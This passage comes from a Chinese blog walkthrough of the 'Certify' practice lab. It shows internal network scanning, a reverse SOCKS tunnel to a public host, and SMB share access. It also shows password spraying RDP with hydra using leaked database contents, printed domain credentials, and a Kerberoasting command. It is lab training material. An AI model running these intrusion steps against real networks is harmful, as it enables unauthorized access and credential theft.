class="line"><span class="string">172.22.9.19:8983 open</span></span><br><span class="line"><span class="string">172.22.9.7:88 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 16</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.9.7</span></span><br><span class="line"><span class="string">   [-&gt;]XIAORANG-DC</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.9.7</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx!</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.9.26</span></span><br><span class="line"><span class="string">   [-&gt;]DESKTOP-CBKTVMO</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.9.26</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        �WWindows Server 2016 Datacenter 14393</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.9.7      [+] DC:XIAORANG\XIAORANG-DC    </span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.9.47     fileserver                          Windows 6.1</span></span><br><span class="line"><span class="string">[*] OsInfo 172.22.9.47  (Windows 6.1)</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.9.19:8983   code:302 len:0      title:None 跳转url: http://172.22.9.19:8983/solr/</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server</span></span><br><span class="line"><span class="string">[+] PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect </span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin</span></span><br><span class="line"><span class="string">已完成 15/16 [-] ftp 172.22.9.47:21 ftp ftp111 530 Login incorrect. </span></span><br></pre></td></tr></table></figure>

<ul>
<li>172.22.9.19 已经拿下</li>
<li>172.22.9.26 DESKTOP-CBKTVMO.xiaorang.lab</li>
<li>172.22.9.7 DC:XIAORANG\XIAORANG-DC</li>
<li>172.22.9.47 fileserver</li>
</ul>
<p>然后我们搭建代理</p>
<h3 id="搭建隧道"><a href="#搭建隧道" class="headerlink" title="搭建隧道"></a>搭建隧道</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_agent -c 124.223.25.186:2334 -s 123 --reconnect 8</span><br><span class="line"></span><br><span class="line">./linux_64_admin -l 2334 -s 123</span><br><span class="line"></span><br><span class="line">use 0</span><br><span class="line">socks 3333</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>

<p>然后Windows在proxifier配置代理</p>
<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><h3 id="SMB共享文件"><a href="#SMB共享文件" class="headerlink" title="SMB共享文件"></a>SMB共享文件</h3><p>访问一下172.22.9.47</p>
<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109144243090.png" alt="image-20251109144243090"></p>
<p>这种文件服务器fileserver 一般都会开启SMB服务，我们用nmap扫描一下端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn -n --top-ports 1000 172.22.9.47</span><br><span class="line"><span class="comment"># 或者全扫描</span></span><br><span class="line">proxychains4 nmap -sT -Pn -n -p- 172.22.9.47</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-sT</code> ：TCP connect 扫描（full TCP connect）</li>
<li><code>-Pn</code>：<strong>跳过主机发现</strong>（不做 ICMP&#x2F;ping&#x2F;ARP 扫描），直接尝试连接目标端口。常用于目标禁用了 ping 或被防火墙屏蔽、但你仍想尝试端口连接时。</li>
<li><code>-n</code>：<strong>不做 DNS 解析</strong>（不把 IP 反解析成主机名），能稍微加速并避免 DNS 相关噪声。</li>
<li><code>-p-</code>：扫描<strong>全部端口</strong>（从 1 到 65535），而不是默认的常见端口集合。</li>
</ul>
<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109144700319.png" alt="image-20251109144700319"></p>
<p>发现445端口确实开着，那我们直接用smbclient去连，smbclient 是一个 命令行工具，用于与 Windows SMB&#x2F;CIFS 共享（如文件共享、打印机共享）进行交互。它允许用户在 Linux&#x2F;Unix 系统上访问 Windows 共享文件夹、上传&#x2F;下载文件、执行远程命令等。<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbclient 172.22.9.47</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109144939693.png" alt="image-20251109144939693"></p>
<p>查看相关命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># help</span></span><br><span class="line"></span><br><span class="line"> open &#123;host,port=445&#125; - opens a SMB connection against the target host/port</span><br><span class="line"> login &#123;domain/username,passwd&#125; - logs into the current SMB connection, no parameters <span class="keyword">for</span> NULL connection. If no password specified, it<span class="string">&#x27;ll be prompted</span></span><br><span class="line"><span class="string"> kerberos_login &#123;domain/username,passwd&#125; - logs into the current SMB connection using Kerberos. If no password specified, it&#x27;</span>ll be prompted. Use the DNS resolvable domain name</span><br><span class="line"> login_hash &#123;domain/username,lmhash:nthash&#125; - logs into the current SMB connection using the password hashes</span><br><span class="line"> logoff - logs off</span><br><span class="line"> shares - list available shares</span><br><span class="line"> use &#123;sharename&#125; - connect to an specific share</span><br><span class="line"> <span class="built_in">cd</span> &#123;path&#125; - changes the current directory to &#123;path&#125;</span><br><span class="line"> lcd &#123;path&#125; - changes the current <span class="built_in">local</span> directory to &#123;path&#125;</span><br><span class="line"> <span class="built_in">pwd</span> - shows current remote directory</span><br><span class="line"> password - changes the user password, the new password will be prompted <span class="keyword">for</span> input</span><br><span class="line"> <span class="built_in">ls</span> &#123;wildcard&#125; - lists all the files <span class="keyword">in</span> the current directory</span><br><span class="line"> lls &#123;<span class="built_in">dirname</span>&#125; - lists all the files on the <span class="built_in">local</span> filesystem.</span><br><span class="line"> tree &#123;filepath&#125; - recursively lists all files <span class="keyword">in</span> folder and sub folders</span><br><span class="line"> <span class="built_in">rm</span> &#123;file&#125; - removes the selected file</span><br><span class="line"> <span class="built_in">mkdir</span> &#123;<span class="built_in">dirname</span>&#125; - creates the directory under the current path</span><br><span class="line"> <span class="built_in">rmdir</span> &#123;<span class="built_in">dirname</span>&#125; - removes the directory under the current path</span><br><span class="line"> put &#123;filename&#125; - uploads the filename into the current path</span><br><span class="line"> get &#123;filename&#125; - downloads the filename from the current path</span><br><span class="line"> mget &#123;mask&#125; - downloads all files from the current directory matching the provided mask</span><br><span class="line"> <span class="built_in">cat</span> &#123;filename&#125; - reads the filename from the current path</span><br><span class="line"> mount &#123;target,path&#125; - creates a mount point from &#123;path&#125; to &#123;target&#125; (admin required)</span><br><span class="line"> umount &#123;path&#125; - removes the mount point at &#123;path&#125; without deleting the directory (admin required)</span><br><span class="line"> list_snapshots &#123;path&#125; - lists the vss snapshots <span class="keyword">for</span> the specified path</span><br><span class="line"> info - returns NetrServerInfo main results</span><br><span class="line"> <span class="built_in">who</span> - returns the sessions currently connected at the target host (admin required)</span><br><span class="line"> close - closes the current SMB Session</span><br><span class="line"> <span class="built_in">exit</span> - terminates the server process (and this session)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先列出可用的SMB共享</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# proxychains4 impacket-smbclient 172.22.9.47</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  124.223.25.186:3333  ...  172.22.9.47:445  ...  OK</span><br><span class="line">Type <span class="built_in">help</span> <span class="keyword">for</span> list of commands</span><br><span class="line"><span class="comment"># shares</span></span><br><span class="line"><span class="built_in">print</span>$</span><br><span class="line">fileshare</span><br><span class="line">IPC$</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到三个共享列表</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use fileshare</span><br><span class="line"><span class="built_in">cd</span> secret</span><br><span class="line"><span class="built_in">cat</span> flag02.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109145418967.png" alt="image-20251109145418967"></p>
<h2 id="flag3-flag4"><a href="#flag3-flag4" class="headerlink" title="flag3&amp;flag4"></a>flag3&amp;flag4</h2><p>之前在根目录看到一个数据库文件，用<code>get personnel.db</code>下下来,拖到物理机处理，放到Navicat里面看一下</p>
<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109151203291.png" alt="image-20251109151203291"></p>
<p>只有密码没有用户名</p>
<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109151641730.png" alt="image-20251109151641730"></p>
<p>这里有一大堆用户名，用密码喷洒</p>
<p>先将这两个表分别导出</p>
<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109151845072.png" alt="image-20251109151845072"></p>
<p>发现导出之后是带引号的，放到kali里面用命令提取一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> xr_users.txt | awk -F<span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27;NR&gt;1 &#123;gsub(/&quot;/, &quot;&quot;, $3); print $3&#125;&#x27;</span> &gt; passwords.txt</span><br><span class="line"></span><br><span class="line">awk -F<span class="string">&#x27;\t&#x27;</span> <span class="string">&#x27;NR&gt;1 &#123;gsub(/&quot;/, &quot;&quot;, $2); print $2&quot;@xiaorang.lab&quot;&#125;&#x27;</span> xr_salary.txt &gt; username.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proxychains4 hydra -L username.txt -P passwords.txt 172.22.9.26 rdp &gt;&gt;result.txt</span><br><span class="line"><span class="built_in">cat</span> result.txt|| grep account</span><br></pre></td></tr></table></figure>

<p><code>hydra</code> 是一款 <strong>多协议网络登录密码爆破工具</strong>。<a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/128194559">https://blog.csdn.net/wangyuxiang946/article/details/128194559</a></p>
<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109152327851.png" alt="image-20251109152327851"></p>
<p>最后拿到两个有效的用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\liupeng:fiAzGwEMgTY</span><br><span class="line">xiaorang.lab\zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure>

<p>但是这里给都没法rdp上去，但是这两个都是与用户，那我们可以试试查找下域用户下的spn</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">H0me</a></li>
        
          <li><a href="/about/">A6out</a></li>
        
          <li><a href="/tags/">T6gs</a></li>
        
          <li><a href="/categories/">Catagory</a></li>
        
          <li><a href="/links/">L1nks</a></li>
        
          <li><a href="/search/">s4arch</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">2.</span> <span class="toc-text">flag1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-44228"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2021-44228</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#grc%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">grc提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fscan%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F"><span class="toc-number">3.1.</span> <span class="toc-text">fscan内网扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E9%9A%A7%E9%81%93"><span class="toc-number">3.2.</span> <span class="toc-text">搭建隧道</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">4.</span> <span class="toc-text">flag2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.</span> <span class="toc-text">SMB共享文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3-flag4"><span class="toc-number">5.</span> <span class="toc-text">flag3&amp;flag4</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&text=春秋云镜Certify"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&is_video=false&description=春秋云镜Certify"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=春秋云镜Certify&body=Check out this article: https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&name=春秋云镜Certify&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&t=春秋云镜Certify"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        
<footer id="footer">
    <div class="footer-left">
        Copyright ©
        
        
        2024-2025
        wanTh3flag
        <br>
    </div>
    
    <div class="footer-right">
        <nav>
            <ul>
                <!--
                --><li><a href="/">H0me</a></li><!--
                --><!--
                --><li><a href="/about/">A6out</a></li><!--
                --><!--
                --><li><a href="/tags/">T6gs</a></li><!--
                --><!--
                --><li><a href="/categories/">Catagory</a></li><!--
                --><!--
                --><li><a href="/links/">L1nks</a></li><!--
                --><!--
                --><li><a href="/search/">s4arch</a></li><!--
                -->
            </ul>
            <ul>
                
                <!-- 不蒜子统计 -->
                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
                <span class="post-meta-divider">|</span>
                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
                
            </ul>
        </nav>
    </div>
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
